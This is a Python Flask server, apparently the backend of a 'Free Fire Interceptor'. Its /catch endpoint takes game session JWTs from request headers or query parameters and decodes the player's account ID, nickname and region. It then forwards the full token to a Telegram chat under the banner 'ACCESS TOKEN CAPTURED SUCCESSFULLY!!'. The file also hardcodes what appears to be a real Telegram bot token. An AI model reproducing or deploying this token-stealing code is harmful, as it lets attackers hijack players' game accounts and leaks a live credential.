import os
import base64
import json
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# Aapke Telegram bot ka token (Render par environment variable se uthayega)
TELEGRAM_TOKEN = os.environ.get("BOT_TOKEN", "8925992649:AAHYLf2jwGxOVCoPO6LdPJx16UT3_c72bKM")
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"

def decode_jwt_payload(token):
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None
        payload_encoded = parts[1]
        payload_encoded += '=' * (-len(payload_encoded) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_encoded)
        return json.loads(decoded_bytes.decode('utf-8'))
    except Exception as e:
        print(f"JWT Decode Error: {e}")
        return None

@app.route('/catch', methods=['POST', 'GET'])
def catch_request():
    try:
        # Game request ke header ya query param se token nikalna
        auth_header = request.headers.get('Authorization') or request.args.get('auth')
        chat_id = request.args.get('chat_id') # Jis Telegram user ko bhejna hai

        if not auth_header:
            return jsonify({"status": "error", "message": "Authorization header missing!"}), 400
        
        if auth_header.startswith("Bearer "):
            jwt_token = auth_header.split(" ")[1]
        else:
            jwt_token = auth_header

        # JWT decode karke data nikalna
        jwt_data = decode_jwt_payload(jwt_token)
        if not jwt_data:
            return jsonify({"status": "error", "message": "Invalid JWT Token format!"}), 400

        account_id = jwt_data.get("account_id")
        encoded_nickname = jwt_data.get("nickname")
        region = jwt_data.get("lock_region")
        open_id = jwt_data.get("external_id")
        
        try:
            nickname = base64.b64decode(encoded_nickname).decode('utf-8') if encoded_nickname else "Unknown"
        except:
            nickname = encoded_nickname

        # Agar chat_id available hai, toh Telegram par message bhej do
        if chat_id:
            msg_text = (
                f"🔑 **ACCESS TOKEN CAPTURED SUCCESSFULLY!!**\n\n"
                f"👤 **ACCOUNT ID:** `{account_id}`\n"
                f"🎮 **PLAYER NAME:** `{nickname}`\n"
                f"🌍 **REGION:** `{region}`\n"
                f"🆔 **OPEN ID:** `{open_id}`\n\n"
                f"🛡️ **JWT TOKEN:**\n`{jwt_token}`"
            )
            requests.post(TELEGRAM_API_URL, json={
                "chat_id": chat_id,
                "text": msg_text,
                "parse_mode": "Markdown"
            })

        return jsonify({
            "status": "success",
            "account_id": account_id,
            "nickname": nickname,
            "region": region
        }), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home():
    return "Free Fire Interceptor Backend is Running!"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
    
